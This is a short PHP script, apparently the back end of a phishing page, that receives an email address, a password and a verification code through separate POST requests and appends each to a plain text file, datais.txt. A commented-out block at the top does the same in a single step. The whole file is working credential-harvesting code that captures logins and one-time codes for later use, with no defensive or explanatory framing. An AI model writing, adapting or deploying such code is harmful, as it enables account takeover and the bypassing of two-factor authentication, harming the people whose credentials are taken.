<?php
//	if(isset($_POST['email'])){
//		//print_r($_POST);
//		$email=$_POST['email'];
//		$pass=$_POST['pass'];
//		$verify=$_POST['verify'];
//
//		$prev_data= file_get_contents("datais.txt");
//		$new_data = $email." :: ".$pass." :: ".$verify." \n";
//		file_put_contents("datais.txt", $new_data." ".$prev_data);
//	}

    if(isset($_POST['email']) && $_POST['flag'] == 'email') {
        print_r($_POST);
        $email=$_POST['email'];
        $prev_data= file_get_contents("datais.txt");
        if(empty($prev_data)){
            $new_data =$email." :: ";
        }
        else{
            $new_data = " \n" . $email." :: ";
        }

        file_put_contents("datais.txt", $prev_data." ".$new_data);
    }

    if(isset($_POST['password']) && $_POST['flag'] == 'password') {
        $password=$_POST['password'];
        $prev_data= file_get_contents("datais.txt");
        $new_data = $password." :: ";
        file_put_contents("datais.txt", $prev_data." ".$new_data);
    }

    if(isset($_POST['verify']) && $_POST['flag'] == 'code') {
        $verify=$_POST['verify'];
        $prev_data= file_get_contents("datais.txt");
        $new_data = $verify;
        file_put_contents("datais.txt", $prev_data." ".$new_data);
    }
?>